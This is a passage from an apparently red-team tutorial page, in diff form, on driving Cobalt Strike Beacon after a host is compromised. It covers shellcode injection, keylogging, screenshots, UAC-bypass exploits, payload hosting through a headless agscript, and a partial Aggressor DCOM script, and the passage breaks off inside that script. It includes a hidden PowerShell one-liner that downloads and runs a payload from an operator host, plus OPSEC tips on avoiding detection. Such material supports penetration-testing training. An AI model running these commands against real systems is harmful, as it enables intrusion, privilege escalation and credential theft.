+</span><span id="__span-13-84"><a id="__codelineno-13-84" name="__codelineno-13-84" href="#__codelineno-13-84"></a>    socks                     Start SOCKS4a server to relay traffic
+</span><span id="__span-13-85"><a id="__codelineno-13-85" name="__codelineno-13-85" href="#__codelineno-13-85"></a>    socks stop                Stop SOCKS4a server
+</span><span id="__span-13-86"><a id="__codelineno-13-86" name="__codelineno-13-86" href="#__codelineno-13-86"></a>    spawn                     Spawn a session 
+</span><span id="__span-13-87"><a id="__codelineno-13-87" name="__codelineno-13-87" href="#__codelineno-13-87"></a>    spawnas                   Spawn a session as another user
+</span><span id="__span-13-88"><a id="__codelineno-13-88" name="__codelineno-13-88" href="#__codelineno-13-88"></a>    spawnto                   Set executable to spawn processes into
+</span><span id="__span-13-89"><a id="__codelineno-13-89" name="__codelineno-13-89" href="#__codelineno-13-89"></a>    spawnu                    Spawn a session under another process
+</span><span id="__span-13-90"><a id="__codelineno-13-90" name="__codelineno-13-90" href="#__codelineno-13-90"></a>    spunnel                   Spawn and tunnel an agent via rportfwd
+</span><span id="__span-13-91"><a id="__codelineno-13-91" name="__codelineno-13-91" href="#__codelineno-13-91"></a>    spunnel_local             Spawn and tunnel an agent via Cobalt Strike client rportfwd
+</span><span id="__span-13-92"><a id="__codelineno-13-92" name="__codelineno-13-92" href="#__codelineno-13-92"></a>    ssh                       Use SSH to spawn an SSH session on a host
+</span><span id="__span-13-93"><a id="__codelineno-13-93" name="__codelineno-13-93" href="#__codelineno-13-93"></a>    ssh-key                   Use SSH to spawn an SSH session on a host
+</span><span id="__span-13-94"><a id="__codelineno-13-94" name="__codelineno-13-94" href="#__codelineno-13-94"></a>    steal_token               Steal access token from a process
+</span><span id="__span-13-95"><a id="__codelineno-13-95" name="__codelineno-13-95" href="#__codelineno-13-95"></a>    timestomp                 Apply timestamps from one file to another
+</span><span id="__span-13-96"><a id="__codelineno-13-96" name="__codelineno-13-96" href="#__codelineno-13-96"></a>    unlink                    Disconnect from parent Beacon
+</span><span id="__span-13-97"><a id="__codelineno-13-97" name="__codelineno-13-97" href="#__codelineno-13-97"></a>    upload                    Upload a file
+</span></code></pre></div>
+<h2 id="help">Help <command><a class="headerlink" href="#help" title="Permanent link">&para;</a></h2>
+<p>We can also get help of a command with <code>help &lt;command&gt;</code>:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>beacon&gt; help sleep
+</span><span id="__span-14-2"><a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a>Use: sleep [time in seconds] &lt;jitter&gt;
+</span><span id="__span-14-3"><a id="__codelineno-14-3" name="__codelineno-14-3" href="#__codelineno-14-3"></a>
+</span><span id="__span-14-4"><a id="__codelineno-14-4" name="__codelineno-14-4" href="#__codelineno-14-4"></a>Change how often the beacon calls home. Use sleep 0 to force Beacon to call 
+</span><span id="__span-14-5"><a id="__codelineno-14-5" name="__codelineno-14-5" href="#__codelineno-14-5"></a>home many times each second. 
+</span><span id="__span-14-6"><a id="__codelineno-14-6" name="__codelineno-14-6" href="#__codelineno-14-6"></a>
+</span><span id="__span-14-7"><a id="__codelineno-14-7" name="__codelineno-14-7" href="#__codelineno-14-7"></a>Specify a jitter value (0-99) to force Beacon to randomly modify its sleep time.
+</span></code></pre></div>
+<blockquote>
+<p><strong>Note</strong>: Parameters wrapped in <code>[ ]</code> are mandatory, whilst those in <code>&lt; &gt;</code> are optional although the default value maybe in not the best option.</p>
+</blockquote>
+<h2 id="sleep">Sleep<a class="headerlink" href="#sleep" title="Permanent link">&para;</a></h2>
+<p>With <code>sleep</code> command we can modify the time when the beacon checks into the team server, by default is setted to 60 seconds.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>beacon&gt; sleep 5
+</span><span id="__span-15-2"><a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a>[*] Tasked beacon to sleep for 5s
+</span><span id="__span-15-3"><a id="__codelineno-15-3" name="__codelineno-15-3" href="#__codelineno-15-3"></a>[+] host called home, sent: 16 bytes
+</span></code></pre></div>
+<blockquote>
+<p><strong>OPSEC Note</strong>: Set a fast check-in can increase the chance of detection, it is also recommended to use a jitter which randomize the check-in time by a given percentage.</p>
+</blockquote>
+<h2 id="file-management">File Management<a class="headerlink" href="#file-management" title="Permanent link">&para;</a></h2>
+<p>There are some commands to interact with files.</p>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a><span class="c"># List the file on the specified directory</span>
+</span><span id="__span-16-2"><a id="__codelineno-16-2" name="__codelineno-16-2" href="#__codelineno-16-2"></a><span class="n">beacon</span> <span class="p">&gt;</span> <span class="nb">ls </span><span class="p">&lt;</span><span class="n">C</span><span class="p">:\</span><span class="n">Path</span><span class="p">&gt;</span>
+</span><span id="__span-16-3"><a id="__codelineno-16-3" name="__codelineno-16-3" href="#__codelineno-16-3"></a>
+</span><span id="__span-16-4"><a id="__codelineno-16-4" name="__codelineno-16-4" href="#__codelineno-16-4"></a><span class="c"># Change into the specified working directory</span>
+</span><span id="__span-16-5"><a id="__codelineno-16-5" name="__codelineno-16-5" href="#__codelineno-16-5"></a><span class="n">beacon</span> <span class="p">&gt;</span> <span class="nb">cd </span><span class="no">[directory]</span>
+</span><span id="__span-16-6"><a id="__codelineno-16-6" name="__codelineno-16-6" href="#__codelineno-16-6"></a>
+</span><span id="__span-16-7"><a id="__codelineno-16-7" name="__codelineno-16-7" href="#__codelineno-16-7"></a><span class="c"># Delete a file\folder</span>
+</span><span id="__span-16-8"><a id="__codelineno-16-8" name="__codelineno-16-8" href="#__codelineno-16-8"></a><span class="n">beacon</span> <span class="p">&gt;</span> <span class="nb">rm </span><span class="p">[</span><span class="n">file</span><span class="p">\</span><span class="n">folder</span><span class="p">]</span>
+</span><span id="__span-16-9"><a id="__codelineno-16-9" name="__codelineno-16-9" href="#__codelineno-16-9"></a>
+</span><span id="__span-16-10"><a id="__codelineno-16-10" name="__codelineno-16-10" href="#__codelineno-16-10"></a><span class="c"># File copy</span>
+</span><span id="__span-16-11"><a id="__codelineno-16-11" name="__codelineno-16-11" href="#__codelineno-16-11"></a><span class="n">beacon</span> <span class="p">&gt;</span> <span class="nb">cp </span><span class="no">[src] [dest]</span>
+</span><span id="__span-16-12"><a id="__codelineno-16-12" name="__codelineno-16-12" href="#__codelineno-16-12"></a>
+</span><span id="__span-16-13"><a id="__codelineno-16-13" name="__codelineno-16-13" href="#__codelineno-16-13"></a><span class="c"># Download a file from the path on the Beacon host</span>
+</span><span id="__span-16-14"><a id="__codelineno-16-14" name="__codelineno-16-14" href="#__codelineno-16-14"></a><span class="n">beacon</span> <span class="p">&gt;</span> <span class="n">download</span> <span class="p">[</span><span class="n">C</span><span class="p">:\</span><span class="n">filePath</span><span class="p">]</span>
+</span><span id="__span-16-15"><a id="__codelineno-16-15" name="__codelineno-16-15" href="#__codelineno-16-15"></a>
+</span><span id="__span-16-16"><a id="__codelineno-16-16" name="__codelineno-16-16" href="#__codelineno-16-16"></a><span class="c"># Lists downloads in progress</span>
+</span><span id="__span-16-17"><a id="__codelineno-16-17" name="__codelineno-16-17" href="#__codelineno-16-17"></a><span class="n">beacon</span> <span class="p">&gt;</span> <span class="n">downloads</span>
+</span><span id="__span-16-18"><a id="__codelineno-16-18" name="__codelineno-16-18" href="#__codelineno-16-18"></a>
+</span><span id="__span-16-19"><a id="__codelineno-16-19" name="__codelineno-16-19" href="#__codelineno-16-19"></a><span class="c"># Cancel a download currently in progress</span>
+</span><span id="__span-16-20"><a id="__codelineno-16-20" name="__codelineno-16-20" href="#__codelineno-16-20"></a><span class="n">beacon</span> <span class="p">&gt;</span> <span class="n">cancel</span> <span class="p">[*</span><span class="n">file</span><span class="p">*]</span>
+</span><span id="__span-16-21"><a id="__codelineno-16-21" name="__codelineno-16-21" href="#__codelineno-16-21"></a>
+</span><span id="__span-16-22"><a id="__codelineno-16-22" name="__codelineno-16-22" href="#__codelineno-16-22"></a><span class="c"># Upload a file from the attacker to the current Beacon host</span>
+</span><span id="__span-16-23"><a id="__codelineno-16-23" name="__codelineno-16-23" href="#__codelineno-16-23"></a><span class="n">beacon</span> <span class="p">&gt;</span> <span class="n">upload</span> <span class="p">[/</span><span class="n">path</span><span class="p">/</span><span class="n">to</span><span class="p">/</span><span class="n">file</span><span class="p">]</span>
+</span></code></pre></div>
+<h2 id="execute-assembly">Execute Assembly<a class="headerlink" href="#execute-assembly" title="Permanent link">&para;</a></h2>
+<p>The <code>execute-assembly</code> command allows the beacon to run <code>.NET</code> executables directly from memory.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a>beacon&gt; execute-assembly [/path/script.exe]  [arguments]
+</span></code></pre></div>
+<h2 id="powershell-commands">PowerShell Commands<a class="headerlink" href="#powershell-commands" title="Permanent link">&para;</a></h2>
+<p>There are different ways to execute powershell commands on the beacon.</p>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a><span class="c"># Import a Powershell .ps1 script from the control server and save it in memory in Beacon</span>
+</span><span id="__span-18-2"><a id="__codelineno-18-2" name="__codelineno-18-2" href="#__codelineno-18-2"></a><span class="n">beacon</span> <span class="p">&gt;</span> <span class="n">powershell-import</span> <span class="p">[/</span><span class="n">path</span><span class="p">/</span><span class="n">to</span><span class="p">/</span><span class="n">script</span><span class="p">.</span><span class="n">ps1</span><span class="p">]</span>
+</span><span id="__span-18-3"><a id="__codelineno-18-3" name="__codelineno-18-3" href="#__codelineno-18-3"></a>
+</span><span id="__span-18-4"><a id="__codelineno-18-4" name="__codelineno-18-4" href="#__codelineno-18-4"></a><span class="c"># Setup a local TCP server bound to localhost and download the script imported from above using powershell.exe. Then the specified function and any arguments are executed and output is returned.</span>
+</span><span id="__span-18-5"><a id="__codelineno-18-5" name="__codelineno-18-5" href="#__codelineno-18-5"></a><span class="n">beacon</span> <span class="p">&gt;</span> <span class="n">powershell</span> <span class="no">[commandlet][arguments]</span>
+</span><span id="__span-18-6"><a id="__codelineno-18-6" name="__codelineno-18-6" href="#__codelineno-18-6"></a>
+</span><span id="__span-18-7"><a id="__codelineno-18-7" name="__codelineno-18-7" href="#__codelineno-18-7"></a><span class="c"># Launch the given function using Unmanaged Powershell, which does not start powershell.exe. The program used is set by spawnto</span>
+</span><span id="__span-18-8"><a id="__codelineno-18-8" name="__codelineno-18-8" href="#__codelineno-18-8"></a><span class="n">beacon</span> <span class="p">&gt;</span> <span class="n">powerpick</span> <span class="no">[commandlet] [argument]</span>
+</span><span id="__span-18-9"><a id="__codelineno-18-9" name="__codelineno-18-9" href="#__codelineno-18-9"></a>
+</span><span id="__span-18-10"><a id="__codelineno-18-10" name="__codelineno-18-10" href="#__codelineno-18-10"></a><span class="c"># Inject Unmanaged Powershell into a specific process and execute the specified command. This is useful for long-running Powershell jobs</span>
+</span><span id="__span-18-11"><a id="__codelineno-18-11" name="__codelineno-18-11" href="#__codelineno-18-11"></a><span class="n">beacon</span> <span class="p">&gt;</span> <span class="n">psinject</span> <span class="no">[pid][arch] [commandlet] [arguments]</span>
+</span></code></pre></div>
+<h2 id="shellcode-injection">Shellcode Injection<a class="headerlink" href="#shellcode-injection" title="Permanent link">&para;</a></h2>
+<p>It is possible to inject shellcode directly on a existent process. Its very useful when we need to spawn a listener of a different C2 or a meterpreter.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a>beacon&gt; execute C:\Windows\System32\notepad.exe
+</span><span id="__span-19-2"><a id="__codelineno-19-2" name="__codelineno-19-2" href="#__codelineno-19-2"></a>beacon&gt; ps
+</span><span id="__span-19-3"><a id="__codelineno-19-3" name="__codelineno-19-3" href="#__codelineno-19-3"></a>
+</span><span id="__span-19-4"><a id="__codelineno-19-4" name="__codelineno-19-4" href="#__codelineno-19-4"></a> PID   PPID  Name                         Arch  Session     User
+</span><span id="__span-19-5"><a id="__codelineno-19-5" name="__codelineno-19-5" href="#__codelineno-19-5"></a> ---   ----  ----                         ----  -------     -----
+</span><span id="__span-19-6"><a id="__codelineno-19-6" name="__codelineno-19-6" href="#__codelineno-19-6"></a> 1492  4268  notepad.exe                  x64   1           CORP\user
+</span><span id="__span-19-7"><a id="__codelineno-19-7" name="__codelineno-19-7" href="#__codelineno-19-7"></a>
+</span><span id="__span-19-8"><a id="__codelineno-19-8" name="__codelineno-19-8" href="#__codelineno-19-8"></a>beacon&gt; shinject 1492 x64 C:\Payloads\msf.bin
+</span></code></pre></div>
+<h1 id="hosting-files">Hosting Files<a class="headerlink" href="#hosting-files" title="Permanent link">&para;</a></h1>
+<p>Cobalt Strike allows us to host files in his web server. Go to <code>Attacks -&gt; Web Drive-by -&gt; Host File</code>.</p>
+<p><img alt="" src="../images/cobaltstrike-hostfile.png" /></p>
+<h1 id="screenshots">Screenshots<a class="headerlink" href="#screenshots" title="Permanent link">&para;</a></h1>
+<p>We can retrieve important information doing screenshots of the user's desktop. We can retrieve shortcuts they have, what documents they're looking and so on.</p>
+<p>Screenshots are stored in <code>View -&gt; Screenshots</code>.</p>
+<p>Beacon has multiple commands to take screenshots.</p>
+<ul>
+<li>
+<p><strong>printscreen</strong>: Take a single screenshot via PrintScr method.
+<div class="language-text highlight"><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a>beacon&gt; printscreen
+</span></code></pre></div></p>
+</li>
+<li>
+<p><strong>screenhost</strong>: Take a single screenshot.
+<div class="language-text highlight"><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a>beacon&gt; screenhost
+</span></code></pre></div></p>
+</li>
+<li>
+<p><strong>screenwatch</strong>: Take periodic screenshots.
+<div class="language-text highlight"><pre><span></span><code><span id="__span-22-1"><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a>beacon&gt; screenwatch
+</span></code></pre></div></p>
+</li>
+</ul>
+<h1 id="keylogger">Keylogger<a class="headerlink" href="#keylogger" title="Permanent link">&para;</a></h1>
+<p>A keylogger can capture the keystrokes of a user, which is specially useful for capturing usernames, passwords and other sensitive data.</p>
+<p>We can see the output of the keylogger in <code>View -&gt; Keystrokes</code>.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-23-1"><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a>beacon&gt; keylogger
+</span></code></pre></div>
+<p>The keylogger runs as a job that can be stopped with the jobkill command.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-24-1"><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a>beacon&gt; jobs
+</span><span id="__span-24-2"><a id="__codelineno-24-2" name="__codelineno-24-2" href="#__codelineno-24-2"></a>[*] Jobs
+</span><span id="__span-24-3"><a id="__codelineno-24-3" name="__codelineno-24-3" href="#__codelineno-24-3"></a>
+</span><span id="__span-24-4"><a id="__codelineno-24-4" name="__codelineno-24-4" href="#__codelineno-24-4"></a> JID  PID   Description
+</span><span id="__span-24-5"><a id="__codelineno-24-5" name="__codelineno-24-5" href="#__codelineno-24-5"></a> ---  ---   -----------
+</span><span id="__span-24-6"><a id="__codelineno-24-6" name="__codelineno-24-6" href="#__codelineno-24-6"></a> 1    0     keystroke logger
+</span><span id="__span-24-7"><a id="__codelineno-24-7" name="__codelineno-24-7" href="#__codelineno-24-7"></a>
+</span><span id="__span-24-8"><a id="__codelineno-24-8" name="__codelineno-24-8" href="#__codelineno-24-8"></a>beacon&gt; jobkill 1
+</span></code></pre></div>
+<h1 id="user-sessions">User Sessions<a class="headerlink" href="#user-sessions" title="Permanent link">&para;</a></h1>
+<p>We can check which users are currently logged on the compromised machine.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-25-1"><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a>beacon&gt; net logons
+</span></code></pre></div>
+<h1 id="bypass-uac">Bypass UAC<a class="headerlink" href="#bypass-uac" title="Permanent link">&para;</a></h1>
+<p>In cobalt strike there are two automatic ways to bypass UAC, with <code>elevate</code> and <code>runasadmin</code>.</p>
+<h2 id="elevate-command">Elevate Command<a class="headerlink" href="#elevate-command" title="Permanent link">&para;</a></h2>
+<p><code>elevate</code> command has two exploits, using Service Control Manager or via token duplication.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-26-1"><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a>beacon&gt; elevate
+</span><span id="__span-26-2"><a id="__codelineno-26-2" name="__codelineno-26-2" href="#__codelineno-26-2"></a>
+</span><span id="__span-26-3"><a id="__codelineno-26-3" name="__codelineno-26-3" href="#__codelineno-26-3"></a>Beacon Local Exploits
+</span><span id="__span-26-4"><a id="__codelineno-26-4" name="__codelineno-26-4" href="#__codelineno-26-4"></a>=====================
+</span><span id="__span-26-5"><a id="__codelineno-26-5" name="__codelineno-26-5" href="#__codelineno-26-5"></a>
+</span><span id="__span-26-6"><a id="__codelineno-26-6" name="__codelineno-26-6" href="#__codelineno-26-6"></a>    Exploit                         Description
+</span><span id="__span-26-7"><a id="__codelineno-26-7" name="__codelineno-26-7" href="#__codelineno-26-7"></a>    -------                         -----------
+</span><span id="__span-26-8"><a id="__codelineno-26-8" name="__codelineno-26-8" href="#__codelineno-26-8"></a>    cve-2020-0796                   SMBv3 Compression Buffer Overflow (SMBGhost) (CVE 2020-0796)
+</span><span id="__span-26-9"><a id="__codelineno-26-9" name="__codelineno-26-9" href="#__codelineno-26-9"></a>    ms14-058                        TrackPopupMenu Win32k NULL Pointer Dereference (CVE-2014-4113)
+</span><span id="__span-26-10"><a id="__codelineno-26-10" name="__codelineno-26-10" href="#__codelineno-26-10"></a>    ms15-051                        Windows ClientCopyImage Win32k Exploit (CVE 2015-1701)
+</span><span id="__span-26-11"><a id="__codelineno-26-11" name="__codelineno-26-11" href="#__codelineno-26-11"></a>    ms16-016                        mrxdav.sys WebDav Local Privilege Escalation (CVE 2016-0051)
+</span><span id="__span-26-12"><a id="__codelineno-26-12" name="__codelineno-26-12" href="#__codelineno-26-12"></a>    svc-exe                         Get SYSTEM via an executable run as a service
+</span><span id="__span-26-13"><a id="__codelineno-26-13" name="__codelineno-26-13" href="#__codelineno-26-13"></a>    uac-schtasks                    Bypass UAC with schtasks.exe (via SilentCleanup)
+</span><span id="__span-26-14"><a id="__codelineno-26-14" name="__codelineno-26-14" href="#__codelineno-26-14"></a>    uac-token-duplication           Bypass UAC with Token Duplication
+</span></code></pre></div>
+<p>Not all UAC bypasses are created equal, and does not have same <code>TokenPrivileges</code>.</p>
+<h3 id="svc-exe">svc-exe<a class="headerlink" href="#svc-exe" title="Permanent link">&para;</a></h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-27-1"><a id="__codelineno-27-1" name="__codelineno-27-1" href="#__codelineno-27-1"></a>beacon&gt; elevate svc-exe tcp-4444
+</span><span id="__span-27-2"><a id="__codelineno-27-2" name="__codelineno-27-2" href="#__codelineno-27-2"></a>Started service 96d2381 on .
+</span><span id="__span-27-3"><a id="__codelineno-27-3" name="__codelineno-27-3" href="#__codelineno-27-3"></a>[+] established link to child beacon: 10.10.10.10
+</span></code></pre></div>
+<blockquote>
+<p><strong>Note</strong>: The beacon obtained with <code>svc-exe</code> bypass will have the necessary token privileges to run post-ex commands such as <code>logonpasswords</code>.</p>
+</blockquote>
+<h3 id="uac-schtasks">uac-schtasks<a class="headerlink" href="#uac-schtasks" title="Permanent link">&para;</a></h3>
+<p>Similar to <code>svc-exe</code>.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-28-1"><a id="__codelineno-28-1" name="__codelineno-28-1" href="#__codelineno-28-1"></a>beacon&gt; elevate uac-schtasks tcp-4444
+</span><span id="__span-28-2"><a id="__codelineno-28-2" name="__codelineno-28-2" href="#__codelineno-28-2"></a>[*] Tasked Beacon to run windows/beacon_bind_tcp (127.0.0.1:4444) in a high integrity context
+</span><span id="__span-28-3"><a id="__codelineno-28-3" name="__codelineno-28-3" href="#__codelineno-28-3"></a>[+] established link to child beacon: 10.10.10.10
+</span></code></pre></div>
+<h3 id="uac-token-duplication">uac-token-duplication<a class="headerlink" href="#uac-token-duplication" title="Permanent link">&para;</a></h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-29-1"><a id="__codelineno-29-1" name="__codelineno-29-1" href="#__codelineno-29-1"></a>beacon&gt; elevate uac-token-duplication tcp-4444
+</span><span id="__span-29-2"><a id="__codelineno-29-2" name="__codelineno-29-2" href="#__codelineno-29-2"></a>Started service 96d2381 on .
+</span><span id="__span-29-3"><a id="__codelineno-29-3" name="__codelineno-29-3" href="#__codelineno-29-3"></a>[+] established link to child beacon: 10.10.10.10
+</span></code></pre></div>
+<blockquote>
+<p><strong>Note</strong>: The beacon obtained with <code>uac-token-duplicatio</code> bypass is limited and some post-ex command such as <code>logonpasswords</code> will fail due to the lack of some TokenPrivileges.</p>
+</blockquote>
+<h2 id="runasadmin-command">Runasadmin Command<a class="headerlink" href="#runasadmin-command" title="Permanent link">&para;</a></h2>
+<p>With <code>runasadmin</code> command we can execute a high privilege command. Like <code>elevate</code> has some exploits.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-30-1"><a id="__codelineno-30-1" name="__codelineno-30-1" href="#__codelineno-30-1"></a>beacon&gt; runasadmin
+</span><span id="__span-30-2"><a id="__codelineno-30-2" name="__codelineno-30-2" href="#__codelineno-30-2"></a>
+</span><span id="__span-30-3"><a id="__codelineno-30-3" name="__codelineno-30-3" href="#__codelineno-30-3"></a>Beacon Command Elevators
+</span><span id="__span-30-4"><a id="__codelineno-30-4" name="__codelineno-30-4" href="#__codelineno-30-4"></a>========================
+</span><span id="__span-30-5"><a id="__codelineno-30-5" name="__codelineno-30-5" href="#__codelineno-30-5"></a>
+</span><span id="__span-30-6"><a id="__codelineno-30-6" name="__codelineno-30-6" href="#__codelineno-30-6"></a>    Exploit                         Description
+</span><span id="__span-30-7"><a id="__codelineno-30-7" name="__codelineno-30-7" href="#__codelineno-30-7"></a>    -------                         -----------
+</span><span id="__span-30-8"><a id="__codelineno-30-8" name="__codelineno-30-8" href="#__codelineno-30-8"></a>    uac-cmstplua                    Bypass UAC with CMSTPLUA COM interface
+</span><span id="__span-30-9"><a id="__codelineno-30-9" name="__codelineno-30-9" href="#__codelineno-30-9"></a>    uac-token-duplication           Bypass UAC with Token Duplication
+</span></code></pre></div>
+<p>Example:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-31-1"><a id="__codelineno-31-1" name="__codelineno-31-1" href="#__codelineno-31-1"></a>beacon&gt; runasadmin uac-cmstplua powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&#39;http://10.10.10.10/b&#39;))&quot;
+</span></code></pre></div>
+<h1 id="headless-colbalt-strike">Headless Colbalt Strike<a class="headerlink" href="#headless-colbalt-strike" title="Permanent link">&para;</a></h1>
+<p>When the team server starts the listeners we had running are started, but any hosted files we had, this could be a problem during persistence mechanisms.</p>
+<p>We can use a headless Cobalt strike client via the <code>agscript</code> utility, to execute an agressor script on start up.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-32-1"><a id="__codelineno-32-1" name="__codelineno-32-1" href="#__codelineno-32-1"></a>agscript [host] [port] [user] [password]
+</span></code></pre></div>
+<p>Create a <code>host_payloads.cna</code> with the follwoing content:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-33-1"><a id="__codelineno-33-1" name="__codelineno-33-1" href="#__codelineno-33-1"></a># Connected and ready
+</span><span id="__span-33-2"><a id="__codelineno-33-2" name="__codelineno-33-2" href="#__codelineno-33-2"></a>on ready {
+</span><span id="__span-33-3"><a id="__codelineno-33-3" name="__codelineno-33-3" href="#__codelineno-33-3"></a>
+</span><span id="__span-33-4"><a id="__codelineno-33-4" name="__codelineno-33-4" href="#__codelineno-33-4"></a>    # Generate payload
+</span><span id="__span-33-5"><a id="__codelineno-33-5" name="__codelineno-33-5" href="#__codelineno-33-5"></a>    $payload = artifact_payload(&quot;http&quot;, &quot;powershell&quot;, &quot;x64&quot;);
+</span><span id="__span-33-6"><a id="__codelineno-33-6" name="__codelineno-33-6" href="#__codelineno-33-6"></a>
+</span><span id="__span-33-7"><a id="__codelineno-33-7" name="__codelineno-33-7" href="#__codelineno-33-7"></a>    # Host payload
+</span><span id="__span-33-8"><a id="__codelineno-33-8" name="__codelineno-33-8" href="#__codelineno-33-8"></a>    site_host(&quot;10.10.10.10&quot;, 80, &quot;/a&quot;, $payload, &quot;text/plain&quot;, &quot;Auto Web Delivery (PowerShell)&quot;, false);
+</span><span id="__span-33-9"><a id="__codelineno-33-9" name="__codelineno-33-9" href="#__codelineno-33-9"></a>
+</span><span id="__span-33-10"><a id="__codelineno-33-10" name="__codelineno-33-10" href="#__codelineno-33-10"></a>}
+</span></code></pre></div>
+<p>You can test the script with:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-34-1"><a id="__codelineno-34-1" name="__codelineno-34-1" href="#__codelineno-34-1"></a>agscript 127.0.0.1 50050 headless password host_payloads.cna
+</span></code></pre></div>
+<p>Finally add this to our existing startup service.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-35-1"><a id="__codelineno-35-1" name="__codelineno-35-1" href="#__codelineno-35-1"></a>ExecStartPost=/bin/sh -c &#39;/usr/bin/sleep 30; /home/user/cobaltstrike/agscript 127.0.0.1 50050 headless password host_payloads.cna &amp;&#39;
+</span></code></pre></div>
+<h1 id="aggressor-scripts">Aggressor Scripts<a class="headerlink" href="#aggressor-scripts" title="Permanent link">&para;</a></h1>
+<p>The <code>.cna</code> files that we load into the Cobalt Strike Script Manager are called Aggressor Scripts. These can override default behaviours in Cobalt Strike to customise the UI (add new menus, commands, etc), extended the data models, extended existing commands like jump, and add brand new, custom commands. Aggressor Scripts are programmed with <strong>Sleep language</strong>.</p>
+<ul>
+<li>Documentation: <a href="https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/agressor_script.htm">https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/agressor_script.htm</a></li>
+<li>Sleep: <a href="http://sleep.dashnine.org/manual/index.html">http://sleep.dashnine.org/manual/index.html</a></li>
+</ul>
+<h2 id="adding-invoke_dcom-to-jump-and-remote-exec-commands">Adding INVOKE_DCOM to JUMP and REMOTE-EXEC commands<a class="headerlink" href="#adding-invoke_dcom-to-jump-and-remote-exec-commands" title="Permanent link">&para;</a></h2>
+<p>Aggressor can be used to register new techniques under <code>jump</code> and <code>remote-exec</code> using <a href="beacon_remote_exploit_register">https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics_aggressor-scripts/as-resources_functions.htm#beacon_remote_exploit_register</a> and <a href="beacon_remote_exec_method_register">https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics_aggressor-scripts/as-resources_functions.htm#beacon_remote_exec_method_register</a> respectively.</p>
+<p>We are going to integrate <code>Invoke-DCOM.ps1</code> into <code>jump</code> command. First we need to create a <code>dcom.cna</code> template file.</p>
+<div class="language-c highlight"><pre><span></span><code><span id="__span-36-1"><a id="__codelineno-36-1" name="__codelineno-36-1" href="#__codelineno-36-1"></a><span class="n">sub</span><span class="w"> </span><span class="n">invoke_dcom</span>
+</span><span id="__span-36-2"><a id="__codelineno-36-2" name="__codelineno-36-2" href="#__codelineno-36-2"></a><span class="p">{</span>
+</span><span id="__span-36-3"><a id="__codelineno-36-3" name="__codelineno-36-3" href="#__codelineno-36-3"></a>
+</span><span id="__span-36-4"><a id="__codelineno-36-4" name="__codelineno-36-4" href="#__codelineno-36-4"></a><span class="p">}</span>
+</span><span id="__span-36-5"><a id="__codelineno-36-5" name="__codelineno-36-5" href="#__codelineno-36-5"></a>
+</span><span id="__span-36-6"><a id="__codelineno-36-6" name="__codelineno-36-6" href="#__codelineno-36-6"></a><span class="n">beacon_remote_exploit_register</span><span class="p">(</span><span class="s">&quot;dcom&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;x64&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;Use DCOM to run a Beacon payload&quot;</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">invoke_dcom</span><span class="p">);</span>
+</span></code></pre></div>
+<p>This will register <code>dcom</code> as a new option inside the <code>jump</code> command and specifies <code>invoke_dcom</code> as the associated callback function. We also need to declare local variables</p>
+<div class="language-c highlight"><pre><span></span><code><span id="__span-37-1"><a id="__codelineno-37-1" name="__codelineno-37-1" href="#__codelineno-37-1"></a><span class="n">sub</span><span class="w"> </span><span class="n">invoke_dcom</span>
+</span><span id="__span-37-2"><a id="__codelineno-37-2" name="__codelineno-37-2" href="#__codelineno-37-2"></a><span class="p">{</span>
+</span><span id="__span-37-3"><a id="__codelineno-37-3" name="__codelineno-37-3" href="#__codelineno-37-3"></a><span class="w">    </span><span class="n">local</span><span class="p">(</span><span class="err">&#39;</span><span class="n">$handle</span><span class="w"> </span><span class="n">$script</span><span class="w"> </span><span class="n">$oneliner</span><span class="w"> </span><span class="n">$payload</span><span class="err">&#39;</span><span class="p">);</span>
